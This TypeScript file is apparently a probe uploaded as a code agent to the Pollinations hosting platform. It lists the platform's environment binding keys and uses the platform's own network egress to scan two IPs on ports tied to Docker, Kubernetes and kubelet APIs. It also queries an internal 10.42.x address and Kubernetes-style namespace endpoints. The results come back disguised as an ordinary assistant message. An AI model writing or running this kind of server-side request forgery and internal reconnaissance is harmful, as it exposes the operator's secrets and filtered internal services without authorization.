// agent.ts — Pollinations code-agent runtime probe.
//
// Part 1 (already reported): bindings / request shape / outbound identity.
// Part 2 (this revision): does the platform's own Cloudflare egress reach
// hosts that are unreachable or filtered from the public internet? Probes are
// bounded (4s) and return one short snippet each.

type Probe = { status?: number; len?: number; head?: string; error?: string };

async function probe(url: string, init?: RequestInit): Promise<Probe> {
    try {
        const r = await fetch(url, {
            ...init,
            signal: AbortSignal.timeout(4000),
            redirect: "manual",
        });
        const t = await r.text().catch(() => "");
        return { status: r.status, len: t.length, head: t.slice(0, 160) };
    } catch (e) {
        return { error: String(e).slice(0, 120) };
    }
}

export default async function main(ctx: any) {
    const request: Request = ctx.request;
    const out: any = {
        ok: true,
        ts: new Date().toISOString(),
        part: 2,
        reqUrl: request.url,
    };

    // --- bindings (unchanged check) ---
    try {
        const mod: any = await import("cloudflare:workers");
        out.envKeys = Object.keys(mod.env || {});
    } catch (e) {
        out.envError = String(e);
    }

    // --- host reachability from the platform's Cloudflare egress ---
    const targets: string[] = [];
    for (const ip of ["20.106.136.139", "172.174.39.180"]) {
        for (const port of [80, 443, 3000, 5000, 6443, 8000, 8080, 8443, 10250, 2375]) {
            targets.push(`http://${ip}:${port}/`);
        }
    }
    targets.push(
        "http://10.42.1.4/",
        "https://api.pollinations.ai/healthz",
        "https://api.pollinations.ai/version",
        "https://api.pollinations.ai/api/v1/namespaces",
        "https://portkey.myceli.ai/",
        "https://gen.pollinations.ai/register",
    );

    const probes: Record<string, Probe> = {};
    for (const t of targets) {
        probes[t] = await probe(t, { method: "GET" });
    }
    out.probes = probes;

    const text = JSON.stringify(out);
    const envelope = {
        id: "resp_runtime_info",
        object: "response",
        created_at: Math.floor(Date.now() / 1000),
        status: "completed",
        model: "agent-runtime-info",
        output: [
            {
                type: "message",
                id: "msg_runtime_info",
                role: "assistant",
                status: "completed",
                content: [{ type: "output_text", text, annotations: [] }],
            },
        ],
        usage: { input_tokens: 1, output_tokens: 1, total_tokens: 2 },
    };
    return new Response(JSON.stringify(envelope), {
        status: 200,
        headers: { "content-type": "application/json" },
    });
}
